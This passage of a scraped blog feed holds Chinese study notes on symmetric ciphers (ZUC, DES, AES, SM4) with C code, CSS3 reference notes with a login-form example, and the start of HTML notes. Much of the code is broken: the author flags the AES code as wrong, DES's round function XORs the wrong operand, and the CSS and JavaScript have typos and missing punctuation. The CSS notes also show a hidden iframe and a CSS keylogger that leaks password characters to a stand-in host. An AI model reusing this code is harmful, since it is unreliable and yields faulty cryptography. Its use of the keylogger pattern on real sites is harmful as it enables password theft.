$iv_5=iv_6=iv_7=00000000$, $iv_{j+8}=iv_j$, $j=8,9,\u0026hellip;,15$.\n1 2 3 4 5 6 for (int i = 0; i \u0026lt; 16; ++i) { key[i] = (((k[2*i] \u0026lt;= \u0026#39;9\u0026#39;) ? (k[2*i]-\u0026#39;0\u0026#39;) : (k[2*i]-\u0026#39;a\u0026#39;+10))\u0026lt;\u0026lt;4) +((k[2*i+1] \u0026lt;= \u0026#39;9\u0026#39;) ? (k[2*i+1]-\u0026#39;0\u0026#39;) : (k[2*i+1]-\u0026#39;a\u0026#39;+10)); iv[i] = (((v[2*i] \u0026lt;= \u0026#39;9\u0026#39;) ? (v[2*i]-\u0026#39;0\u0026#39;) : (v[2*i]-\u0026#39;a\u0026#39;+10))\u0026lt;\u0026lt;4) +((v[2*i+1] \u0026lt;= \u0026#39;9\u0026#39;) ? (v[2*i+1]-\u0026#39;0\u0026#39;) : (v[2*i+1]-\u0026#39;a\u0026#39;+10)); } LSFR: 连接多项式为 $GF(2^{31}-1)$ 上本原多项式 $g(x)=x^{16}-2^{15}x^{15}-2^{17}x^{13}-2^{21}x^{10}-2^{20}x^{4}-2^8-1$; 输出 $m$ 序列周期 $T=(2^{31}-1)^{16}-1$; 生成16个31bit LFSR块. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 void LFSRInitMode(uint32 u){ uint32 v = 0, tmp = 0; v = LFSR[0]; tmp = mod2ExpMulti(LFSR[0],8); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[4],20); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[10],21); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[13],17); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[15],15); v = modAdd(v,tmp); v = modAdd(v,u); if (v == 0){ v = 0x7fffffff; } for (int i = 0; i \u0026lt; 16; ++i) { LFSR[i] = LFSR[i+1]; } LFSR[15] = v; } void LFSRWorkMode(){ uint32 v = 0, tmp = 0; v = LFSR[0]; tmp = mod2ExpMulti(LFSR[0],8); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[4],20); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[10],21); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[13],17); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[15],15); v = modAdd(v,tmp); if (v == 0){ v = 0x7fffffff; } for (int i = 0; i \u0026lt; 16; ++i) { LFSR[i] = LFSR[i+1]; } LFSR[15] = v; } Bit重组: $X_0=S[15]_H|S[14]_L$, $X_1=S[11]_L|S[9]_H$ ,$X_2=S[7]_L|S[5]_H$, $X_3=S[2]_L|S[0]_H$. 1 2 3 4 5 6 void bitRecons(){ X[0] = ((LFSR[15]\u0026amp;0x7fff8000)\u0026lt;\u0026lt;1)|(LFSR[14]\u0026amp;0x0000ffff); X[1] = (LFSR[11]\u0026lt;\u0026lt;16)|(LFSR[9]\u0026gt;\u0026gt;15); X[2] = (LFSR[7]\u0026lt;\u0026lt;16)|(LFSR[5]\u0026gt;\u0026gt;15); X[3] = (LFSR[2]\u0026lt;\u0026lt;16)|(LFSR[0]\u0026gt;\u0026gt;15); } 非线性F函数: $W=(X_0\\oplus R_1)\\boxplus R_2$, $W_1=R_1\\boxplus X_1$, $W_2=R_2\\boxplus X_2$, $R_1=S(L_1(W_{1L}|W_{2H}))$, $R_2=S(L_2(W_{2L}|W_{1H}))$; 其中 $L_1(a)=a\\oplus(a\u0026lt; \u0026lt;_o 2)\\oplus(a\u0026lt; \u0026lt;_o 10)\\oplus(a\u0026lt; \u0026lt;_o 18)\\oplus(a\u0026lt; \u0026lt;_o 24)$, $L_2(a)=a\\oplus(a\u0026lt; \u0026lt;_o 8)\\oplus(a\u0026lt; \u0026lt;_o 14)\\oplus(a\u0026lt; \u0026lt;_o 22)\\oplus(a\u0026lt; \u0026lt;_o 30)$; $S$ 盒为 $(S_0,S_1,S_0,S_1)$, 每8bit作为索引, 返回 $S$ 盒中对应的8bit数值. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 void F(){ uint32 W1 = 0,W2 = 0; W = (X[0]^R1)+R2; W1 = R1+X[1]; W2 = R2+X[2]; R1 = S(L1((W1\u0026lt;\u0026lt;16)|(W2\u0026gt;\u0026gt;16))); R2 = S(L2((W1\u0026gt;\u0026gt;16)|(W2\u0026lt;\u0026lt;16))); } uint32 L1(uint32 x){ return x^rot(x,2)^rot(x,10)^rot(x,18)^rot(x,24); } uint32 L2(uint32 x){ return x^rot(x,8)^rot(x,14)^rot(x,22)^rot(x,30); } uint32 S(uint32 a){ uint8 x[4] = {0}, y[4] = {0}; x[0] = a\u0026gt;\u0026gt;24; x[1] = (a\u0026gt;\u0026gt;16)\u0026amp;0xff; x[2] = (a\u0026gt;\u0026gt;8)\u0026amp;0xff; x[3] = a \u0026amp; 0xff; for (int i = 0; i \u0026lt; 4; ++i) { if (i == 0 || i == 2){ y[i] = S0[x[i]]; } else { y[i] = S1[x[i]]; } } return (y[0]\u0026lt;\u0026lt;24)|(y[1]\u0026lt;\u0026lt;16)|(y[2]\u0026lt;\u0026lt;8)|y[3]; } 密钥流输出: $K=W\\oplus X[3]$, 每个时钟节拍产生32bit密钥流.\n输出参数: OBS 输出比特流(密文或明文).\nZUC生成密钥流分为5个阶段: $ck$ 和 $iv$ 装载到LFSR; 寄存器 $R_1,R_2$ 置空; 初始化模式运行32次; 工作模式运行1次并舍弃输出; 持续工作模式产生密钥流.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // 1. 装载LFSR void keyIVInsert(uint8 *k, uint8 *iv){ for (int i = 0; i \u0026lt; 16; ++i) { LFSR[i] = (k[i]\u0026lt;\u0026lt;23)|(D[i]\u0026lt;\u0026lt;8)|iv[i]; } } // 2. 置空寄存器 uint32 R1 = 0, R2 = 0; // 3. 初始化模式运行32次 void init(uint8 *k, uint8 *iv){ keyIVInsert(k,iv); R1 = 0; R2 = 0; for (int i = 0; i \u0026lt; 32; ++i) { bitRecons(); F(); LFSRInitMode(W\u0026gt;\u0026gt;1); } } uint32 *keyStreamGenerate(unsigned long keyLen){ uint32 *keyStream = (uint32 *)malloc(keyLen*sizeof(uint32)); // 4. 工作模式运行1次并舍弃输出 bitRecons(); F(); LFSRWorkMode(); // 5. 持续工作模式产生密钥流 for (unsigned long i = 0; i \u0026lt; keyLen; ++i) { bitRecons(); F(); keyStream[i] = W^X[3]; LFSRWorkMode(); } return keyStream; } 安全问题: 能够抵御多种已知针对序列密码的攻击, 主要威胁是侧信道攻击.\n分组密码 本质为单表代换, 复杂多轮非线性, 通过混淆和扩散实现. 组件: S盒(混淆扩散), P置换(扩散), 轮函数F, 密钥扩展.\n结构模型\nS-P网络: 每轮异或密钥后, S盒分组小块混淆扩散, P置换整体扩散, $N_i=F(N_{i-1}\\oplus K_i)$. Feistel网络: 分为左右两部分, $R_i=F(R_{i-1},K_i)\\oplus L_{i-1}$, $L_i=R_{i-1}$, 最后一轮不做对换; 同个算法实现加解密. 工作模式:\nECB(电子密码本): 分组用相同密钥加密; 相同明文产生相同密文; 可并行. CBC(密码分组链接): 初始化 $iv$ 得到第一组密文, 第一组密文与第二组明文异或后再加密; TSL及IPSEc协议推荐; 仅解密支持并行. CFB(密文反馈): 初始化 $iv$ 得到密文 $E$, $vi$ 左移 $n$ 位, 密文 $E$ 与明文异或后得到密文 $C$, $C$ 高位 $n$ 位填入 $vi$; 流式数据, 错误有界; 仅解密支持并行. OFB(输出反馈): 初始化 $iv$ 得到密文 $E$, $vi$ 左移 $n$ 位, 密文 $E$ 与高位 $n$ 位填入 $vi$, 密文 $E$ 与明文异或后得到密文 $C$; 流式数据, 错误有界; 不支持并行. CTR(计数器): 自增算子加密后与明文异或得到密文; 相当于一次一密; 简单快速安全可并行. DES 数据加密标准(Data Encryption Standard), 体现Shannon密码设计思想, 公开密码算法先例, 16轮Feistel网络对合加解密.\n密钥扩展: 初始密钥(64bit)经PC1表置换得到 $C_i$ 和 $D_i$ (各28bit), 循环左移 $ls_i$ 位, 经PC2表置换得到第 $i$ 轮子密钥 $K_i$ (48bit); 置换表中元素 $pt_{i}$ 意为将待置换中的第 $pt_{i}$ 位置换到第$i$位. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 void tablePermute(bit1 *permuted, bit1 *origin, bit8 *table, bit8 size){ bit1 tmp[64] = {0}; for (int i = 0; i \u0026lt; size; ++i) { tmp[i] = origin[table[i]-1]; } bitCopy(permuted,tmp,size); } void keyExp(bit8 *key){ bit1 keyPerRound[64] = {0}; bit1 *keyPrL = \u0026amp;keyPerRound[0]; bit1 *keyPrR = \u0026amp;keyPerRound[28]; byteToBit(keyPerRound,key,8); tablePermute(keyPerRound,keyPerRound,PC1,56); for (int i = 0; i \u0026lt; 16; ++i) { bitRot(keyPrL,28,LS[i]); bitRot(keyPrR,28,LS[i]); tablePermute(subKey[i],keyPerRound,PC2,48); } } 初始置换与结束逆置换: 明(密)文(64bit)经IP表置换进入加密, 完成加(解)密后经IPR表置换得到密(明)文(64bit).\n轮函数: 32bit输入经E表置换扩充到48bit, 与子密钥(48bit)异或后, 经S盒压缩回32bit(混淆), 再经P表置换得到32bit输出(扩散); S盒6位输入 $b_1b_2b_3b_4b_5b_6$, 输出$s_{b_1b_6, b_2b_3b_4b_5}$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 void SPermute(bit1 *permuted, bit1 *origin){ int row, col; bit1 *p1 = origin; bit1 *p2 = permuted; for (int i = 0; i \u0026lt; 8; ++i) { row = 2 * p1[0] + p1[5]; col = 8 * p1[1] + 4 * p1[2] + 2 * p1[3] + p1[4]; byteToBit(permuted,\u0026amp;S[i][row][col],4); p1 += 6; p2 += 4; } } void F(bit1 *output, bit1 *input){ bit1 tmp[48] = {0}; tablePermute(tmp,input,E,48); bitXor(tmp,input,48); SPermute(output,tmp); tablePermute(output,output,P,32); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 加密 tablePermute(textBit,textBit,IP,64); for (int i = 0; i \u0026lt;= 15; ++i) { bitCopy(tmp,textBitR,32); F(textBitR,subKey[i]); bitXor(textBitR,textBitL,32); bitCopy(textBitL,tmp,32); } tablePermute(textBit,textBit,IPR,64); // 解密, 密钥顺序相反 tablePermute(textBit,textBit,IP,64); for (int i = 15; i \u0026gt;= 0; --i) { bitCopy(tmp,textBitL,32); F(textBitL,subKey[i]); bitXor(textBitL,textBitR,32); bitCopy(textBitR,tmp,32); } tablePermute(textBit,textBit,IPR,64); S盒是DES中唯一非线性变换, 设计准则: 改变1bit输入至少2bit发生变化; $S(x)$ 和 $S(x\\oplus 001100)$ 至少2bit发生变化; $S(x)\\neq S(x\\oplus 11ef00)$, $e,f\\in{0,1}$; 改变5bit输入, 输出的0和1数目大致相等; 足够的非线性度以抵抗线性攻击; 差分性均匀以抵抗差分攻击; 足够的代数次数和项目以抵抗插值攻击和高阶差分攻击.\n攻击类型: 穷钥攻击; 侧信道攻击(能量分析, 故障注入分析); 差分攻击; 线性攻击.\n安全问题: 密钥太短(有效仅56bit); 存在弱密钥; 互补对称性(异或运算).\n3-DES: 112(1和3轮密钥相同)/256bit密钥; 加解密速度慢.\nAES (something wrong in the AES code)\n高级数据加密标准(Advanced Encryption Standard), 采用10/12/14轮S-P网络非对合加解密(对应128/192/256bit密钥).\n$GF(2)$ 上多项式域 $GF(2^8)$ 中元素为 $b_{(8)}=b_7x^7+b_6x^6+b_5x^5+b_4x^4+b_3x^3+b_2x^2+b_1x+b_0$, 乘法需对既约多项式 $m(x)=x^8+x^4+x^3+x+1$ 取模, 乘法逆元可由扩展Euclid算法得到. 考虑 $xb_{(8)}=(b_{(8)}\u0026lt; \u0026lt; 1)\\oplus m(x)$, 高次乘法可重复 $x$ 乘实现.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 uint8 modMulti(uint8 x, uint8 y){ uint8 ans = 0, tmp; for (int i = 0; i \u0026lt; 8; ++i) { if (x\u0026amp;0x01){ ans ^= y; } tmp = y\u0026amp;0x80; y \u0026lt;\u0026lt;= 1; if (tmp){ y ^= 0x1B; } x \u0026gt;\u0026gt;= 1; } return ans; } $GF(2^8)$ 上 $degf\\leq 3$ 多项式环 $GF(2^8)[x^4+1]$ 中元素为 $b_{(32)}=B_3x^3+B_2x^2+B_1x+B_0$, 乘法需对 $x^4+1$ 取模. 考虑 $xb_{(32)}=b_{(32)}\u0026gt; \u0026gt;8$, 高次乘法可视为 $GF(2^8)$ 上矩阵乘法.\n状态矩阵: 128bit明(密)文和密钥按列优先载入4阶方阵, 每列32bit称为\u0026quot;字\u0026quot;, 加(解)密后按列优先输出密(明)文. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void loadState(uint8 state[4][4], uint8* text){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[j][i] = *(text++); } } } void storeState(uint8* text, uint8 state[4][4]){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { *(text++) = state[j][i]; } } } 密钥扩展: 4字输入, 扩展为44字输出; $w[i]=w[i-1]\\oplus w[i-4]$, $i\\% 4 \\ne 0$; $w[i]=w[i-4]\\oplus S(w\u0026rsquo;[i-1])\\oplus Rcon[i]$, $i \\% 4 = 0$, 即每个字循环左移1字节后进行S盒置换. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 uint32 mixRoll(uint32 x){ uint32 sub1 = S[(x\u0026gt;\u0026gt;24)\u0026amp;0xff]\u0026lt;\u0026lt;24; uint32 sub2 = S[(x\u0026gt;\u0026gt;16)\u0026amp;0xff]\u0026lt;\u0026lt;16; uint32 sub3 = S[(x\u0026amp;0xff)\u0026gt;\u0026gt;8]\u0026lt;\u0026lt;8; uint32 sub4 = S[x\u0026amp;0xff]; return (sub1\u0026amp;0xff000000)^(sub2\u0026amp;0xff0000)^(sub3\u0026amp;0xff00)^(sub4\u0026amp;0xff); } void keyExp(uint8* key){ int m; for (int i = 0; i \u0026lt; 4; ++i) { load(\u0026amp;w[i],key+4*i); } for (int i = 0; i \u0026lt; 10; ++i) { m = 4*i; w[4+m] = w[m]^ mixRol1(w[3+m])^rotConst[i]; w[5+m] = w[1+m]^w[4+m]; w[6+m] = w[2+m]^w[5+m]; w[7+m] = w[3+m]^w[6+m]; } } 轮函数: 主要包括(逆)字节代换, (逆)行位移, (逆)列混合, 轮密钥加(即子密钥异或). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // 加密, 字节代换, 行位移, 列混合, 轮密钥加, 最后一轮跳过列混合 loadState(state, pPlain); addRoundKey(state,pW); for (int j = 0; j \u0026lt; 10; ++j) { pW += 4; subBytes(state); shiftRows(state); mixCols(state); addRoundKey(state,pW); } subBytes(state); shiftRows(state); addRoundKey(state,pW+4); storeState(pCipher,state); // 解密, 密钥顺序相反, 逆行位移, 逆字节代换, 轮密钥加, 逆列混合, 最后一轮跳过逆列混合 loadState(state, pCipher); addRoundKey(state,pW); for (int j = 0; j \u0026lt; 10; ++j) { pW -= 4; shiftRowsInv(state); subBytesInv(state); addRoundKey(state,pW); mixColsInv(state); } shiftRowsInv(state); subBytesInv(state); addRoundKey(state,pW-4); storeState(pPlain,state); 字节代换即取求每个字节在 $GF(2^8)$ 上的逆后进行仿射变换, 可等效为S盒置换; 逆字节代换即逆仿射变换再取逆, 可等效为逆S盒置换.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void subBytes(uint8 state[4][4]){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = S[state[i][j]]; } } } void subBytesInv(uint8 state[4][4]){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = SInv[state[i][j]]; } } } 行位移即第 $i=0,1,2,3$ 个字循环右移 $i$ 字节; 逆行位移即第 $i$ 个字循环左移 $i$ 字节.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 uint32 rol(uint32 x, uint8 n){ return (x\u0026lt;\u0026lt;n)|(x\u0026gt;\u0026gt;(32-n)); } uint32 ror(uint32 x, uint8 n){ return (x\u0026gt;\u0026gt;n)|(x\u0026lt;\u0026lt;(32-n)); } void shiftRows(uint8 state[4][4]){ uint32 tmp[4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { load(\u0026amp;tmp[i],state[i]); tmp[i] = rol(tmp[i],8*i); store(state[i],\u0026amp;tmp[i]); } } void shiftRowsInv(uint8 state[4][4]){ uint32 tmp[4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { load(\u0026amp;tmp[i],state[i]); tmp[i] = ror(tmp[i],8*i); store(state[i],\u0026amp;tmp[i]); } } 列混合即按列的字在 $GF(2^8)[x^4+1]$ 上与 $a(x)={\\rm 0x03}x^3+{\\rm 0x01}x^2+{\\rm 0x01}x+{\\rm 0x02}$ 相乘; 逆列混合即与 $a^{-1}(x)={\\rm 0x0B}x^3+{\\rm 0x0D}x^2+{\\rm 0x09}x+{\\rm 0x0E}$ 相乘; 均可等效为 $GF(2^8)$ 上的矩阵乘法.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 void mixCols(uint8 state[4][4]){ uint8 tmp[4][4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { tmp[i][j] = state[i][j]; } } for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = modMulti(D[i][0],tmp[0][j]) ^ modMulti(D[i][1],tmp[1][j]) ^ modMulti(D[i][2],tmp[2][j]) ^ modMulti(D[i][3],tmp[3][j]); } } } void mixColsInv(uint8 state[4][4]){ uint8 tmp[4][4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { tmp[i][j] = state[i][j]; } } for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = modMulti(DInv[i][0],tmp[0][j]) ^ modMulti(DInv[i][1],tmp[1][j]) ^ modMulti(DInv[i][2],tmp[2][j]) ^ modMulti(DInv[i][3],tmp[3][j]); } } } 安全问题: 能够抵御多种已知针对分组密码的攻击, 主要威胁是侧信道攻击.\nSM4 128bit密钥32轮非平衡Feistel网络. 1字$=$4字节$=$32bit.\n密钥扩展: 初始密钥 $(MK_0,MK_1,MK_2,MK_3)$, $K_i=MK_i\\oplus FK_i$ ,$rk_i = K_{i+4} = K_i\\oplus T(K_{i+1}\\oplus K_{i+2}\\oplus K_{i+3}\\oplus CK_i)$; FK_i 为系统参数, CK_i 为固定参数; 以每个字节前4bit作为行, 后4bit作为列, 进行非线性的S盒置换; 再对字进行线性变换 $B\\oplus (B \u0026lt; \u0026lt;_o 13)\\oplus (B \u0026lt; \u0026lt;_o 23)$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 uint32 TKey(uint32 k){ int sk = SPermute(k); return sk^rot(sk,13)^rot(sk,23); } void generateRk(void){ uint32 K[35]; for (int i = 0; i \u0026lt; 4; ++i) { K[i] = MK[i]^FK[i]; } for (int i = 0; i \u0026lt; 32; ++i) { K[(i+4)%4] = K[i%4]^TKey(K[(i+1)%4]^K[(i+2)%4]^K[(i+3)%4]^CK[i]); rk[i] = K[(i+4)%4]; } } 轮函数: $X_{i+4} = X_i\\oplus T\u0026rsquo;(X_{i+1}\\oplus X_{i+2}\\oplus X_{i+3}\\oplus rK_i)$; 进行非线性的S盒置换后, 再对字进行线性变换 $B\\oplus (B \u0026lt; \u0026lt;_o 2)\\oplus (B \u0026lt; \u0026lt;_o 10)\\oplus (B \u0026lt; \u0026lt;_o 18)\\oplus (B \u0026lt; \u0026lt;_o 24)$.\n反序输出: 输入 $(X_1,X_2,X_3,X_4)$, 输出 $(Y_1,Y_2,Y_3,Y_4)=(X_{35},X_{34},X_{33},X_{32})$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 uint32 T(uint32 x){ int sx = SPermute(x); return sx^rot(sx,2)^rot(sx,10)^rot(sx,18)^rot(sx,24); } void F32(void){ for (int i = 0; i \u0026lt; 32; ++i) { X[(i+4)%4] = X[i%4]^T(X[(i+1)%4]^X[(i+2)%4]^X[(i+3)%4]^rk[i]); } for (int i = 0; i \u0026lt; 4; ++i) { Y[i] = X[3-i]; } } ","date":"2023-09-04T00:00:00Z","permalink":"https://example.com/p/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/","title":"对称加密"},{"content":"Cascading Style Sheets\n基本结构 1 selector, ... {property:value; ... } 继承: Netscape4不支持 格式化: 块级元素, 行内元素\n多重样式 更详细定义 - 继承 重复定义 - 优先级: 同级别下权重大, 同权重下后定义 !important 1-0-0-0-0 内联 1-0-0-0 1 \u0026lt;tag style=\u0026#34;property:value;...\u0026#34;\u0026gt; id选择器 1-0-0 1 #id {property:value; ... } class选择器 0-1-0 1 .class {property:value; ... } property选择器 0-1-0 1 [property=\u0026#34;value\u0026#34;] {property:value; ... } ~= 包含值(完整) |= 以值开头(完整) ^= 匹配以值开头 $= 匹配以值结尾 *= 匹配值\n伪类(pseudo class) 0-1-0 1 :pseudo_class {property:value; ... } active, checked, disabled, empty, enabled, first-child, first-of-type, focus, hover, in-range, invalid, lang, last-child, last-of-type, link, nth-child(n), nth-last-child(n), nth-last-of-type(n), nth-of-type(n), only-of-type, only-child, option, out-of-range, read-only, read-write, required, root, target, valid, visited\ntag选择器 0-0-1 1 tag {property:value; ... } 伪元素(pseudo element) 0-0-1 1 ::pseudo_element {property:value; ... } after, before, first-letter, first-line, selection\n通配符* 关系符, + \u0026gt; ~ \u0026quot;\u0026quot; | | 否定符:not( ) 0-0-0 分组 tag,tag 共同样式 后代 tag tag 包含元素 父子 tag\u0026gt;tag 仅限子元素 相邻 tag+tag 仅对紧邻元素 外部链接 1 2 3 \u0026lt;head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;文件名.css\u0026#34;\u0026gt; \u0026lt;\\head\u0026gt; 常用属性 背景: background, -attachment (scroll; fixed; local; initial; inherit), -color, -image, -position, -repeat, -clip, -origin (padding-box; border-box; content-box), -size 字体: @font-face (font-family; src); font, -family, -size, -style (normal; italic; oblique), -variant (normal; small-caps), -weight 文本: color, direction (ltr; rtl), letter-space, line-height, vertical-align, white-space; text-align (left; right; center; justify), -decoration (none; underline; overline; line-through; blink), -indent, -transform (none; capitalize; uppercase; lowercase), -overflow (clip; ellipsis; string), -shadow; word-spacing, -break (normal; break-all; keep-all), -wrap 分页: page-break-after, -before, -inside (auto; always; avoid; left; right) 定位: position (absolute; fixed; relative; static; sticky), bottom, left, right, top, clear (left; right; both; none), clip (shape; auto), cursor (url; default; auto; crosshair; pointer; move; text; wait; help; \u0026hellip;), display (absolute; fixed; relative; static; sticky), float (left; right; none), overflow (visible; hidden; scroll; auto), visibility (visible; hidden; collapse), z-index 网络: grid-column, grid-row Box: box, -shadow, -sizing; overflow, -x/y (no-display; no-content); opacity 外边距: margin, -left/right/top/bottom 轮廓: outline, -color/style/width 边框: border, -left/right/top/bottom, - -color/style/width, -radius 内边距: padding, -left/right/top/bottom 内容: height/width, max/min-height/width 弹性: flex, -grow, -shrink, -basis, -flow, -direction; align, -content, -items (stretch; center; flex-start; flex-end; baseline), -self (space-between; space-evenly; space-around); justify-content, order 列表: list-style, -image, -position (outside; inside), -type (none; disc; circle; squre; decimal; lower-roman; upper-alpha; \u0026hellip;) 多列: columns, conlumn-count, -fill, -gap, -span, -width, -rule, - -color/style/width 表格: border-collapse, -spacing, caption-side, empty-cells, table-layout 生成: content (none; normal; counter; attr; string; open-quote; close-quote; no-open-quote; no-close-quote; url), -increment, -reset; quotes 动画: @keyframes; animation, -name, -duration, -timing-funcion, -delay, -iteration-count, -direction, -play-state 过渡: transition, -property, -duration, -timing-function, -delay 实例: 简单表单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;登录界面\u0026lt;\\title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;login.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;用户登录\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;loginForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;username\u0026#34; placeholder=\u0026#34;用户名\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;密码\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;登录\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p id=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script src=\u0026#34;login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 body { font-family: Arial, sans-serif; } .container { width: 300px; margin: 0 auto; margin-top: 100px; } h1 { text-align: center; } form { margin-top: 30px; } input[type=text] input[type=password] input[type=submit] { display: block; width: 100% padding: 10px margin-bottom: 10xp; } button[type=submit] { background-color: #4CAF50; color: white; } #message { text-align: center; margin-top: 15px; font-weight: bold; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 document.getElementById(\u0026#39;loginForm\u0026#39;).addEventListerner(\u0026#39;submit\u0026#39;, function(e) { e.preventDefault(); var username = document.getElementById(\u0026#39;username\u0026#39;).value; var password = document.getElementById(\u0026#39;password\u0026#39;).value; var data = { username: username, password: password }; fetch(\u0026#39;/login\u0026#39;, { method: \u0026#39;PUT\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify(data) }) .then(function(response) { return responce.text(); }) .then(function(message) { document.getElementById(\u0026#39;message\u0026#39;).textContent = message; }) .catch(function(error) { console.log(error); }) }); 潜在漏洞 iframe transparent 1 \u0026lt;iframe src=\u0026#34;URL\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; keylogger 1 2 3 4 5 \u0026lt;style\u0026gt; input[type=\u0026#34;password\u0026#34;][value$=\u0026#34;a\u0026#34;] { backgroud-image: url(\u0026#34;http//localhost:3000/a\u0026#34;); } \u0026lt;/style\u0026gt; ","date":"2023-08-25T00:00:00Z","permalink":"https://example.com/p/css3/","title":"CSS3"},{"content":"HyperText Markup Language\n基本结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!doctype html\u0026gt; \u0026lt;!-- 声明为html5文件 --\u0026gt; \u0026lt;html\u0026gt; \u0026lt;!-- html内容 --\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- 头部元素: 标题, 元数据, 脚本, 样式， icon, 关系 --\u0026gt; \u0026lt;title\u0026gt; \u0026lt;!-- html5中标题必需 --\u0026gt; \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- 可见页面内容: 段落, 表单, 链接, 格式, 样式, 程序, 列表, 表格, 框架, 多媒体--\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 元素(element): 1 \u0026lt;begin_tag property=\u0026#34;value\u0026#34;; ...\u0026gt; content \u0026lt;/end_tag\u0026gt; 空元素(empty) 1 \u0026lt;tag property=\u0026#34;value\u0026#34;; ... /\u0026gt; 小写文件名, 完整后缀.html 常用标签 基础: !DOCTYPE, html, head, title, body, h1, \u0026hellip;, h6, p, br, hr, !\u0026ndash;\u0026hellip;\u0026ndash; 格式: abbr, b, cite, code, del, i, q, s, small, sup, sub, template, time, u, var, wbr 表单: form, input, textarea, button, select, optgroup, option, label, fieldset, legend, datalist, output 框架: iframe 图像: img, map, area, canvas, figcaption, figure, svg 音视频: audio, source, video 链接: a, link 列表: ul, ol, li, dt, dd 表格: table, caption, th, tr, td, thead, tbody, tfoot, col, colgroup 语义: style, div, span, header, nav, section, article, aside, footer,details, dialog, summary 元信息: base, meta 程序: script, noscript, embed, object 常用属性 全局: class, contenteditable, data-*, dir, draggable, hidden, id, lang, spellcheck, style, tabindex, title html: manifest del: cite, datetime time: datetime form: accept-charset, action, autocomplete (on; off), enctype (application/x-www-form-urlencoded; multipart/form-data; text/plain), method (get; post), name, target (_blank; _parent; _self; _top) input: accept, alt, autocomplete, autofocus, checked, disabled, formaction, formenctype, formmethod, formtarget, height, maxlength, multiple, name, 